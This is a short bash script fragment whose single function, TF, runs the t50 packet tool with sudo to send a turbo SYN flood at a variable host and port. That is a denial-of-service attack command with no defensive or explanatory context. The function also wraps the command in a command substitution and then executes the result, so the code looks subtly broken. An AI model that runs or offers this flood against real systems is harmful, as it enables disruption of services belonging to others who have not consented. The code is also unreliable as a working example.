#! /bin/bash

TF(){
	TF=$(`sudo t50 $HOST --flood -S --turbo --dport $PORT`)
	$TF
}

